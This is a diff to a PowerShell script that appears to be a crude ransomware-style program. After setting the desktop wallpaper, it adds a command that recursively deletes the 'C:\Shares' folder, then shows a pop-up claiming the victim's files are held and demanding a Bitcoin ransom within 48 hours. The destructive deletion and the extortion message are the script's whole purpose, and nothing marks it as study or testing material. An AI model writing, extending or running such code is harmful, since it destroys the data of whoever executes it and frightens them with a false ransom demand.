@@ -97,6 +97,10 @@ Function Update-Wallpaper {
 }
 
 Update-Wallpaper C:\Pictures\r.png Tile
-#Show the message
+#background end
+# Delete the shares folder 
+Remove-Item 'C:\Shares' -Recurse
+
+#Pop Up Box
 $result = [System.Windows.Forms.MessageBox]::Show('We have all of your important files!!! We demand £10,000,000 Bitcoins for their return.:) you have 48 hours. GO!', 'You are in trouble Sunshine', 'Ok', 'Warning')
 exit
